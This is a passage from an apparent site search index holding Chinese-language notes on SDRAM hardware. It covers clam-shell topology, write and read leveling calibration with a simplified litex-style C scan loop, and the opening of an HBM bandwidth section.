\u200b\u770b\u5230\u200b\u540c\u6837\u200b\u7684\u200b\u6ce2\u5f62\u200b\uff0c\u200b\u9700\u8981\u200b\u5728\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u4e00\u4fa7\u200b\u7ed9\u200b\u6570\u636e\u4fe1\u53f7\u200b\u52a0\u4e0a\u200b\u53ef\u53d8\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5ef6\u8fdf\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b\u6821\u51c6\u200b\uff0c\u200b\u624d\u80fd\u200b\u77e5\u9053\u200b\u662f\u200b\u591a\u5c11\u200b\u3002</p>"},{"location":"hardware/sdram.html#clam-shell-topology","title":"Clam-shell topology","text":"<p>\u200b\u9664\u4e86\u200b Fly-by topology\uff0c\u200b\u5728\u200b\u4e00\u4e9b\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8282\u7701\u200b PCB \u200b\u9762\u79ef\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u4f7f\u7528\u200b Clam-shell topology\u3002Clam-shell \u200b\u662f\u200b\u8d1d\u58f3\u200b\u7684\u200b\u610f\u601d\u200b\uff0c\u200b\u8d1d\u58f3\u200b\u6709\u200b\u4e0a\u4e0b\u200b\u4e24\u4e2a\u200b\u90e8\u5206\u200b\u5408\u5728\u4e00\u8d77\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5176\u5b9e\u200b Clam-shell topology \u200b\u5c31\u662f\u200b\u5f62\u8c61\u200b\u5730\u200b\u8868\u793a\u200b\u5728\u200b PCB \u200b\u7684\u200b\u6b63\u9762\u200b\u548c\u200b\u80cc\u9762\u200b\u90fd\u200b\u6709\u200b SDRAM \u200b\u82af\u7247\u200b\u7684\u200b\u60c5\u5f62\u200b\uff1a</p> <p> </p> Clam-shell Topology\uff08\u200b\u56fe\u6e90\u200bVersal ACAP Programmable Network on Chip and Integrated Memory Controller LogiCORE IP Product Guide (PG313) \uff09 <p>\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u5229\u7528\u200b\u4e86\u200b PCB \u200b\u80cc\u9762\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u4f46\u662f\u200b\u540c\u65f6\u200b\u4e5f\u200b\u5e26\u6765\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u95ee\u9898\u200b\uff1a\u200b\u76f4\u89c2\u200b\u5730\u200b\u8bb2\u200b\uff0c\u200b\u5982\u679c\u200b\u4e24\u4e2a\u200b\u82af\u7247\u200b\u90fd\u200b\u653e\u5728\u200b PCB \u200b\u7684\u200b\u6b63\u9762\u200b\uff0c\u200b\u8981\u200b\u8fde\u7ebf\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u5f15\u811a\u200b\u987a\u5e8f\u200b\u63a5\u8fd1\u200b\u4e00\u81f4\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6bd4\u8f83\u200b\u5bb9\u6613\u200b\u5730\u200b\u8fde\u63a5\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u5f88\u591a\u200b\u4ea4\u53c9\u200b\u7684\u200b\u5730\u65b9\u200b\u3002\u200b\u4f46\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b\u5728\u200b\u6b63\u9762\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5728\u200b\u80cc\u9762\u200b\uff0c\u200b\u5f15\u811a\u200b\u7684\u200b\u987a\u5e8f\u200b\u5c31\u200b\u5012\u8f6c\u200b\u8fc7\u6765\u200b\u4e86\u200b\uff0c\u200b\u8fde\u7ebf\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u6bd4\u8f83\u200b\u56f0\u96be\u200b\u3002</p> <p>\u200b\u89e3\u51b3\u200b\u7684\u200b\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u4fee\u6539\u200b\u5f15\u811a\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u628a\u200b\u4e00\u4e9b\u200b\u5f15\u811a\u200b\u7684\u200b\u529f\u80fd\u200b\u8fdb\u884c\u200b\u5bf9\u8c03\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u8d70\u7ebf\u200b\u66f4\u52a0\u200b\u7b80\u5355\u200b\uff1a</p> <p> </p> SDRAM \u200b\u5f15\u811a\u200b\u955c\u50cf\u200b\uff08\u200b\u56fe\u6e90\u200bVersal ACAP PCB Design User Guide (UG863)\uff09 <p>\u200b\u8868\u683c\u200b\u4e2d\u200b\u7279\u610f\u200b\u6311\u9009\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u7279\u6b8a\u200b\u529f\u80fd\u200b\u7684\u200b\u5f15\u811a\u200b\u6765\u200b\u4ea4\u6362\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5927\u90e8\u5206\u200b\u529f\u80fd\u200b\uff0c\u200b\u5373\u4f7f\u200b\u4ea4\u6362\u200b\u4e86\u200b\u5f15\u811a\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\u3002\u200b\u4f8b\u5982\u200b Row \u200b\u5730\u5740\u200b\u4ea4\u6362\u200b\u4e86\u200b\u51e0\u4e2a\u200b\u4f4d\u200b\uff0c\u200b\u867d\u7136\u200b\u7269\u7406\u200b\u4e0a\u200b\u4fdd\u5b58\u200b\u7684\u200b\u5730\u65b9\u200b\u53d8\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u8bfb\u5199\u200b\u6570\u636e\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u5bf9\u4e8e\u200b Mode Register Set \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5fc5\u987b\u200b\u8981\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u81ea\u884c\u200b\u4ea4\u6362\u200b\u4f4d\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u5728\u200b PCB \u200b\u4e0a\u200b\u8fde\u63a5\u200b\u65f6\u200b\u518d\u200b\u4ea4\u6362\u200b\u56de\u6765\u200b\uff0c\u200b\u624d\u80fd\u200b\u4fdd\u8bc1\u200b\u5728\u200b SDRAM \u200b\u4e00\u4fa7\u200b\u5f97\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u7ed3\u679c\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0cClam-shell Topology \u200b\u7684\u200b\u6b63\u9762\u200b\u548c\u200b\u80cc\u9762\u200b\u5404\u6709\u200b\u4e00\u4e2a\u200b cs_n \u200b\u7247\u9009\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u200b\u548c\u200b Dual Rank \u200b\u4e0d\u540c\u200b\uff1aDual Rank \u200b\u662f\u200b\u6b63\u9762\u200b\u548c\u200b\u80cc\u9762\u200b\u90fd\u200b\u6709\u200b\u540c\u6837\u200b\u6570\u91cf\u200b\u7684\u200b DRAM \u200b\u82af\u7247\u200b\uff0c\u200b\u5171\u4eab\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b\u3001\u200b\u6570\u636e\u4fe1\u53f7\u200b\u548c\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u540c\u4e00\u65f6\u95f4\u200b\u53ea\u6709\u200b\u4e00\u4fa7\u200b\u7684\u200b DRAM \u200b\u82af\u7247\u200b\u5728\u200b\u4f7f\u7528\u200b\uff0c\u200b\u597d\u5904\u200b\u662f\u200b\u5185\u5b58\u5bb9\u91cf\u200b\u7ffb\u500d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e24\u4e2a\u200b rank \u200b\u53ef\u4ee5\u200b\u4e92\u76f8\u200b\u63a9\u76d6\u200b\u5ef6\u8fdf\u200b\uff1b\u200b\u800c\u200b Clam Shell Topology \u200b\u7684\u200b\u4e24\u4e2a\u200b cs_n \u200b\u662f\u200b\u4e3a\u4e86\u200b\u7ed9\u200b Mode Register Set \u200b\u64cd\u4f5c\u200b\u6307\u5b9a\u200b\u6b63\u9762\u200b\u6216\u200b\u80cc\u9762\u200b\uff0c\u200b\u800c\u200b\u5176\u4f59\u200b\u7684\u200b\u5927\u90e8\u5206\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6b63\u9762\u200b\u548c\u200b\u80cc\u9762\u200b\u540c\u65f6\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u4eec\u200b\u7684\u200b\u6570\u636e\u4fe1\u53f7\u200b\u5e76\u200b\u6ca1\u6709\u200b\u5171\u4eab\u200b\u3002</p>"},{"location":"hardware/sdram.html#_10","title":"\u6821\u51c6","text":"<p>SDRAM \u200b\u6821\u51c6\u200b\uff0c\u200b\u6216\u8005\u8bf4\u200b SDRAM \u200b\u8bad\u7ec3\u200b\uff0c\u200b\u4e3b\u8981\u200b\u6709\u200b\u5982\u4e0b\u200b\u51e0\u4e2a\u200b\u6b65\u9aa4\u200b\uff1a</p> <ol> <li>Write Leveling</li> <li>Read Leveling</li> </ol>"},{"location":"hardware/sdram.html#write-leveling","title":"Write Leveling","text":"<p>Write Leveling \u200b\u8981\u200b\u89e3\u51b3\u200b\u7684\u200b\u662f\u200b Fly-by Topology \u200b\u5e26\u6765\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u4e0d\u200b\u4e00\u81f4\u200b\uff0c\u200b\u5bfc\u81f4\u200b SDRAM \u200b\u770b\u5230\u200b\u9519\u8bef\u200b\u7684\u200b\u4fe1\u53f7\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u5177\u4f53\u200b\u5730\u200b\u8bb2\u200b\uff0cWrite Leveling \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u8ba9\u200b SDRAM \u200b\u82af\u7247\u200b\u63a5\u53d7\u200b\u5230\u200b\u7684\u200b DQS \u200b\u4fe1\u53f7\u200b\u4e0e\u200b CK \u200b\u4fe1\u53f7\u200b\u540c\u6b65\u200b\uff1a</p> <p> </p> Write Leveling \u200b\u6240\u200b\u8981\u200b\u8fbe\u5230\u200b\u7684\u200b DQS \u200b\u4e0e\u200b CK \u200b\u540c\u6b65\u200b\u7684\u200b\u6548\u679c\u200b <p>\u200b\u4e3a\u4e86\u200b\u8fbe\u5230\u200b\u8fd9\u4e2a\u200b\u76ee\u7684\u200b\uff0c\u200b\u601d\u8def\u200b\u5c31\u662f\u200b\u4e0d\u65ad\u200b\u8c03\u6574\u200b DQS \u200b\u8f93\u51fa\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u89c2\u6d4b\u200b\u4e0d\u540c\u200b\u5ef6\u8fdf\u200b\u4e0b\u200b\u7684\u200b\u884c\u4e3a\u200b\uff0c\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b DQS \u200b\u4e0e\u200b CK \u200b\u540c\u6b65\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u503c\u200b\u3002\u200b\u4e3a\u4e86\u200b\u914d\u5408\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u505a\u200b Write Leveling\uff0cSDRAM \u200b\u53ef\u4ee5\u200b\u8fdb\u5165\u200b\u4e00\u4e2a\u200b Write Leveling Mode\uff0c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u72b6\u6001\u200b\u4e0b\u200b\uff0cSDRAM \u200b\u4f1a\u200b\u5728\u200b DQS \u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u5bf9\u200b CK \u200b\u8fdb\u884c\u200b\u91c7\u6837\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u7ed3\u679c\u200b\u8f93\u51fa\u200b\u5230\u200b DQ \u200b\u4e0a\u200b\u3002\u200b\u6b64\u65f6\u200b\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b DQS \u200b\u5ef6\u8fdf\u200b\u5c31\u200b\u4f1a\u200b\u5e26\u6765\u200b\u4e0d\u540c\u200b\u7684\u200b\u7ed3\u679c\u200b\uff1a</p> <p> </p> \u200b\u4e0d\u540c\u200b\u7684\u200b DQS \u200b\u5ef6\u8fdf\u200b\u4e0b\u200b\uff0cDQS \u200b\u5bf9\u200b CK \u200b\u91c7\u6837\u200b\u7684\u200b\u7ed3\u679c\u200b <p>\u200b\u4e0a\u56fe\u200b\u4e2d\u200b delay0 \u200b\u548c\u200b delay1 \u200b\u4e24\u79cd\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cDQS \u200b\u91c7\u6837\u200b\u5230\u200b\u4e86\u200b CK \u200b\u7684\u200b\u8d1f\u534a\u200b\u5468\u671f\u200b\uff0c\u200b\u800c\u200b delay2 \u200b\u548c\u200b delay3 \u200b\u65f6\u200b DQS \u200b\u91c7\u6837\u200b\u5230\u200b\u4e86\u200b CK \u200b\u7684\u200b\u6b63\u534a\u200b\u5468\u671f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u8ba9\u200b DQS \u200b\u548c\u200b CK \u200b\u540c\u6b65\u200b\uff0c\u200b\u5e94\u8be5\u200b\u628a\u200b DQS \u200b\u5ef6\u8fdf\u200b\u8bbe\u7f6e\u200b\u5728\u200b delay1 \u200b\u548c\u200b delay2 \u200b\u4e4b\u95f4\u200b\u3002</p> <p>\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b Write Leveling \u200b\u7684\u200b\u7b97\u6cd5\u200b\uff1a</p> <ol> <li>\u200b\u8bbe\u7f6e\u200b SDRAM \u200b\u8fdb\u5165\u200b Write Leveling \u200b\u6a21\u5f0f\u200b\uff0c\u200b\u6b64\u65f6\u200b SDRAM \u200b\u4f1a\u200b\u4f7f\u7528\u200b DQS \u200b\u5bf9\u200b CK \u200b\u91c7\u7528\u200b\uff0c\u200b\u628a\u200b\u7ed3\u679c\u200b\u8f93\u51fa\u200b\u5230\u200b DQ</li> <li>\u200b\u63a7\u5236\u5668\u200b\u679a\u4e3e\u200b DQS \u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u8bfb\u200b\u53d6\u51fa\u200b\u6bcf\u4e2a\u200b DQS \u200b\u5ef6\u8fdf\u200b\u4e0b\u200b\u7684\u200b DQ \u200b\u7ed3\u679c\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b 0-1 \u200b\u4e32\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a<code>001111111111111111110000</code>\uff0c\u200b\u5373\u200b\u968f\u7740\u200b\u5ef6\u8fdf\u200b\u589e\u5927\u200b\uff0c\u200b\u5148\u200b\u91c7\u6837\u200b\u5230\u200b 0\uff0c\u200b\u518d\u200b\u91c7\u6837\u200b\u5230\u200b 1\uff0c\u200b\u6700\u540e\u200b\u53c8\u200b\u91c7\u6837\u200b\u5230\u200b 0</li> <li>\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b DQS \u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u4f7f\u5f97\u200b DQ \u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u4ece\u200b 0 \u200b\u5230\u200b 1 \u200b\u7684\u200b\u53d8\u5316\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6309\u7167\u200b\u8fd9\u4e2a\u200b\u5ef6\u8fdf\u200b\u8f93\u51fa\u200b\uff0cDQS \u200b\u5c31\u200b\u4f1a\u200b\u4e0e\u200b CK \u200b\u540c\u6b65\u200b</li> <li>\u200b\u8bbe\u7f6e\u200b SDRAM \u200b\u7ed3\u675f\u200b Write Leveling \u200b\u6a21\u5f0f\u200b</li> </ol> <p>\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u8981\u200b\u5bf9\u200b\u6bcf\u4e2a\u200b DQS \u200b\u4fe1\u53f7\u200b\u5206\u522b\u200b\u8fdb\u884c\u200b\u3002\u200b\u4e0b\u9762\u200b\u4ee5\u200b litex \u200b\u7684\u200b SDRAM \u200b\u6821\u51c6\u200b\u4ee3\u7801\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u7528\u200b C \u200b\u4ee3\u7801\u200b\u5b9e\u73b0\u200b\u7b80\u5316\u200b\u7684\u200b\u6d41\u7a0b\u200b\uff1a</p> int sdram_write_leveling_scan(int *delays, int loops, int show)<pre><code>/* \u200b\u6253\u5f00\u200b SDRAM \u200b\u7684\u200b Write Leveling \u200b\u6a21\u5f0f\u200b */\nsdram_write_leveling_on();\n\n/* \u200b\u5faa\u73af\u200b\u6bcf\u4e2a\u200b SDRAM \u200b\u5185\u5b58\u6761\u200b */\nfor(i=0;i&lt;SDRAM_PHY_MODULES;i++) {\n  /* \u200b\u5faa\u73af\u200b\u6bcf\u4e2a\u200b DQS \u200b\u4fe1\u53f7\u200b */\n  for (dq_line = 0; dq_line &lt; DQ_COUNT; dq_line++) {\n    /* \u200b\u8bbe\u7f6e\u200b DQS \u200b\u521d\u59cb\u200b\u5ef6\u8fdf\u200b\u4e3a\u200b 0 */\n    sdram_leveling_action(i, dq_line, write_rst_delay);\n\n    /* \u200b\u5faa\u73af\u200b DQS \u200b\u5ef6\u8fdf\u200b */\n    for(j=0;j&lt;err_ddrphy_wdly;j++) {\n      int zero_count = 0;\n      int one_count = 0;\n\n      /* \u200b\u591a\u6b21\u200b\u91c7\u6837\u200b */\n      for (k=0; k&lt;loops; k++) {\n        /* \u200b\u53d1\u9001\u200b DQS \u200b\u5e8f\u5217\u200b\uff1a00000001 */\n        /* SDRAM \u200b\u5bf9\u200b CK \u200b\u8fdb\u884c\u200b\u91c7\u6837\u200b */\n        ddrphy_wlevel_strobe_write(1);\n\n        cdelay(100);\n        /* \u200b\u4ece\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u4e2d\u200b\u8bfb\u51fa\u200b DQ \u200b\u4e0a\u200b\u7684\u200b\u6570\u636e\u200b */\n        csr_rd_buf_uint8(sdram_dfii_pix_rddata_addr(0), buf, DFII_PIX_DATA_BYTES);\n\n        /* \u200b\u7edf\u8ba1\u200b 1 \u200b\u548c\u200b 0 \u200b\u7684\u200b\u4e2a\u6570\u200b */\n        if (buf[SDRAM_PHY_MODULES-1-i] != 0)\n          one_count++;\n        else\n          zero_count++;\n      }\n      if (one_count &gt; zero_count)\n        /* \u200b\u8ba4\u4e3a\u200b DQS \u200b\u91c7\u6837\u200b\u5230\u200b\u4e86\u200b CK \u200b\u7684\u200b\u6b63\u534a\u200b\u5468\u671f\u200b */\n        taps_scan[j] = 1;\n      else\n        /* \u200b\u8ba4\u4e3a\u200b DQS \u200b\u91c7\u6837\u200b\u5230\u200b\u4e86\u200b CK \u200b\u7684\u200b\u8d1f\u534a\u200b\u5468\u671f\u200b */\n        taps_scan[j] = 0;\n\n      /* \u200b\u6bcf\u6b21\u200b\u5faa\u73af\u200b\u589e\u52a0\u200b\u4e00\u6b21\u200b DQS \u200b\u5ef6\u8fdf\u200b */\n      sdram_leveling_action(i, dq_line, write_inc_delay);\n    }\n\n    /* \u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u6700\u957f\u200b\u7684\u200b\u8fde\u7eed\u200b 1 \u200b\u7684\u200b\u5e8f\u5217\u200b */\n    one_window_active = 0;\n    one_window_start = 0;\n    one_window_count = 0;\n    one_window_best_start = 0;\n    one_window_best_count = -1;\n    for(j=0;j&lt;err_ddrphy_wdly+1;j++) {\n      if (one_window_active) {\n        if ((j == err_ddrphy_wdly) || (taps_scan[j] == 0)) {\n          /* \u200b\u7ed3\u675f\u200b\u4e86\u200b\u4e00\u6bb5\u200b\u8fde\u7eed\u200b\u7684\u200b 1 */\n          one_window_active = 0;\n          one_window_count = j - one_window_start;\n          /* \u200b\u8bb0\u5f55\u200b\u6700\u957f\u200b\u7684\u200b\u8fde\u7eed\u200b 1 \u200b\u7684\u200b\u957f\u5ea6\u200b\u548c\u200b\u4f4d\u7f6e\u200b */\n          if (one_window_count &gt; one_window_best_count) {\n            one_window_best_start = one_window_start;\n            one_window_best_count = one_window_count;\n          }\n        }\n      } else {\n        /* \u200b\u627e\u5230\u200b\u8fde\u7eed\u200b\u7684\u200b 1 \u200b\u7684\u200b\u5f00\u5934\u200b */\n        if (j != err_ddrphy_wdly &amp;&amp; taps_scan[j]) {\n          one_window_active = 1;\n          one_window_start = j;\n        }\n      }\n    }\n\n    /* \u200b\u8981\u200b\u627e\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u5c31\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b 1 \u200b\u5e8f\u5217\u200b\u7684\u200b\u5f00\u59cb\u200b\u4f4d\u7f6e\u200b */\n    delays[i] = one_window_best_start;\n  }\n}\n\n/* \u200b\u5173\u95ed\u200b SDRAM \u200b\u7684\u200b Write Leveling \u200b\u6a21\u5f0f\u200b */\nsdram_write_leveling_off();\n</code></pre>"},{"location":"hardware/sdram.html#read-leveling","title":"Read Leveling","text":"<p>\u200b\u5728\u200b Write Leveling \u200b\u9636\u6bb5\u200b\uff0c\u200b\u89e3\u51b3\u200b\u4e86\u200b SDRAM \u200b\u5904\u200b\u4fe1\u53f7\u200b\u7684\u200b\u540c\u6b65\u200b\u95ee\u9898\u200b\u3002\u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6570\u636e\u200b\u662f\u4ece\u200b SDRAM \u200b\u53d1\u9001\u7ed9\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b\u6570\u636e\u200b\u5230\u8fbe\u200b\u63a7\u5236\u5668\u200b\u7684\u200b\u65f6\u95f4\u200b\u53ef\u80fd\u200b\u4e5f\u200b\u4e0d\u540c\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e5f\u200b\u9700\u8981\u200b\u5bf9\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u8fdb\u884c\u200b\u6821\u51c6\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u5224\u65ad\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\uff0c\u200b\u505a\u6cd5\u200b\u662f\u200b\u9996\u5148\u200b\u5199\u5165\u200b\u5df2\u77e5\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u8bfb\u51fa\u6765\u200b\uff0c\u200b\u5982\u679c\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u5b8c\u5168\u4e00\u81f4\u200b\uff0c\u200b\u5c31\u200b\u8bf4\u660e\u200b\u53ef\u4ee5\u200b\u6b63\u786e\u200b\u5730\u200b\u8fdb\u884c\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u5b9e\u73b0\u200b\u601d\u8def\u200b\u548c\u200b Write Leveling \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u679a\u4e3e\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u8fdb\u884c\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u89c2\u5bdf\u200b\u6bcf\u4e2a\u200b\u5ef6\u8fdf\u200b\u4e0b\u200b\u7684\u200b\u8f93\u51fa\u200b\uff1a</p> <ol> <li>\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff08\u200b\u6216\u8005\u200b\u7528\u200b SDRAM \u200b\u7684\u200b\u751f\u6210\u200b\u56fa\u5b9a\u200b Pattern \u200b\u8f93\u51fa\u200b\u7684\u200b\u529f\u80fd\u200b\uff09</li> <li>\u200b\u8bbe\u7f6e\u200b\u5ef6\u8fdf\u200b\u4ece\u200b 0 \u200b\u5f00\u59cb\u200b\u5faa\u73af\u200b\uff0c\u200b\u4e0d\u65ad\u200b\u589e\u5927\u200b</li> <li>\u200b\u5728\u200b\u6bcf\u4e2a\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u8bbe\u5b9a\u200b\u4e0b\u200b\uff0c\u200b\u8bfb\u200b\u53d6\u51fa\u200b\u6570\u636e\u200b\uff0c\u200b\u628a\u200b\u8bfb\u53d6\u200b\u7684\u200b\u7ed3\u679c\u200b\u4e0e\u200b\u4e4b\u524d\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u8fdb\u884c\u200b\u6bd4\u8f83\u200b</li> <li>\u200b\u7edf\u8ba1\u200b\u51fa\u200b\u54ea\u4e9b\u200b\u5ef6\u8fdf\u200b\u6761\u4ef6\u200b\u4e0b\u200b\uff0c\u200b\u8bfb\u53d6\u6570\u636e\u200b\u662f\u200b\u51c6\u786e\u200b\u7684\u200b\uff0c\u200b\u51c6\u786e\u200b\u7684\u200b\u8bb0\u4e3a\u200b 1\uff0c\u200b\u4e0d\u200b\u51c6\u786e\u200b\u7684\u200b\u8bb0\u4e3a\u200b 0</li> <li>\u200b\u627e\u5230\u200b\u8868\u793a\u200b\u51c6\u786e\u200b\u7684\u200b 1 \u200b\u7684\u200b\u8303\u56f4\u200b\uff0c\u200b\u53d6\u4e2d\u70b9\u200b\u4f5c\u4e3a\u200b\u6700\u7ec8\u200b\u7684\u200b\u6821\u51c6\u200b\u7ed3\u679c\u200b</li> </ol> <p>\u200b\u6ce8\u610f\u200b\u8fd9\u91cc\u200b\u4e0d\u518d\u200b\u662f\u200b\u627e\u5230\u200b 0-1 \u200b\u7684\u200b\u53d8\u5316\u200b\u7684\u200b\u5730\u65b9\u200b\uff0cWrite Leveling \u200b\u627e\u200b 0-1 \u200b\u53d8\u5316\u200b\u662f\u200b\u4e3a\u4e86\u200b\u540c\u6b65\u200b\uff0c\u200b\u540c\u6b65\u200b\u7684\u200b\u5730\u65b9\u200b\u6b63\u662f\u200b 0-1 \u200b\u53d8\u5316\u200b\u7684\u200b\u5730\u65b9\u200b\uff1b\u200b\u800c\u200b Read Leveling \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u8981\u200b\u8bfb\u200b\u53d6\u51fa\u200b\u6b63\u786e\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5df2\u77e5\u200b\u6709\u200b\u4e00\u6bb5\u200b\u8fde\u7eed\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u533a\u95f4\u200b\uff0c\u200b\u533a\u95f4\u200b\u5185\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u8bfb\u51fa\u200b\u6b63\u786e\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53d6\u200b\u5176\u4e2d\u200b\u70b9\u200b\uff0c\u200b\u5373\u4f7f\u200b\u56e0\u4e3a\u200b\u6e29\u5ea6\u200b\u7b49\u200b\u6761\u4ef6\u200b\u53d8\u5316\u200b\uff0c\u200b\u533a\u95f4\u200b\u51fa\u73b0\u200b\u79fb\u52a8\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4fdd\u7559\u200b\u4e86\u200b\u8db3\u591f\u200b\u7684\u200b\u4f59\u91cf\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4f9d\u7136\u200b\u53ef\u4ee5\u200b\u5de5\u4f5c\u200b\u3002\u200b\u53d6\u4e2d\u70b9\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u4e5f\u200b\u79f0\u4e3a\u200b Read Centering\u3002</p>"},{"location":"hardware/sdram.html#hbm","title":"HBM","text":"<p>HBM \u200b\u5168\u79f0\u200b\u662f\u200b High Bandwidth Memory\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u9ad8\u5e26\u5bbd\u200b\u5185\u5b58\u200b\uff0c\u200b\u5176\u200b\u6280\u672f\u200b\u4e5f\u200b\u662f\u200b\u57fa\u4e8e\u200b SDRAM\uff0c\u200b\u56e0\u6b64\u200b\u653e\u5728\u200b\u8fd9\u91cc\u200b\u548c\u200b DDR SDRAM \u200b\u8fdb\u884c\u200b\u5bf9\u6bd4\u200b\u3002</p> <p>HBM \u200b\u76f8\u6bd4\u200b\u524d\u9762\u200b\u7684\u200b DDR SDRAM\uff0c\u200b\u5b83\u200b\u5806\u53e0\u200b\u4e86\u200b\u591a\u4e2a\u200b SDRAM\uff0c\u200b\u63d0\u4f9b\u200b\u591a\u4e2a\u200b channel \u200b\u5e76\u4e14\u200b\u63d0\u9ad8\u200b\u4e86\u200b\u4f4d\u200b\u5bbd\u200b\u3002\u200b\u4f8b\u5982\u200b Micron HBM with ECC\uff0c\u200b\u5806\u53e0\u200b\u4e86\u200b 4/8 \u200b\u5c42\u200b DRAM\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b 8 \u200b\u4e2a\u200b channel\uff0c\u200b\u6bcf\u4e2a\u200b channel \u200b\u7684\u200b\u6570\u636e\u200b\u5bbd\u5ea6\u200b\u662f\u200b 128 \u200b\u4f4d\u200b\uff0c\u200b\u4ee5\u200b 3200 MT/s \u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4e00\u4e2a\u200b HBM \u200b\u82af\u7247\u200b\u7684\u200b\u6570\u636e\u200b\u4f20\u8f93\u901f\u7387\u200b\u6700\u5927\u200b\u662f\u200b\uff1a</p> \\[ 3200 \\mathrm{(MT/s)} * 